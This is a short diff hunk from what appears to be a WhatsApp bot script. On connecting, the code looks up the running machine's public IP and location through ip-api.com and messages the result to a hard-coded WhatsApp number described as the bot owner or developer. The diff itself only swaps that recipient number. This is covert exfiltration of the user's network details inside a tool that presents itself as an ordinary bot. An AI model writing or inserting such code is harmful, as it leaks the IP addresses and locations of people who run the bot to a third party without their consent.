@@ -45,7 +45,7 @@ pemuda.autoReconnect = ReconnectMode.onConnectionLost
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       pemuda.sendMessage("6283146208804@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Herman Chanel",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/6282252509320?text=Assalamualaikum"}}})
+       pemuda.sendMessage("6289696454872@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Herman Chanel",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/6282252509320?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
    })
       
